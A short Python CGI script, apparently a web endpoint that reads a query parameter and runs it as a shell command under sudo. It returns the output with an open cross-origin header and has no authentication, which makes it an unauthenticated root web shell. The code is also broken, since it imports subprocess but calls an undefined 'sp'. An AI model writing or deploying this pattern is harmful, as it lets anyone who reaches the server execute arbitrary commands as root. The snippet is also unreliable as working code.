#!/usr/bin/python3

import subprocess
import cgi

print("content-type: text/html")
print("Access-Control-Allow-Origin: *")
print()

f = cgi.FieldStorage()
cmd = f.getvalue("x")

o = sp.getoutput("sudo " + cmd)
print(o)
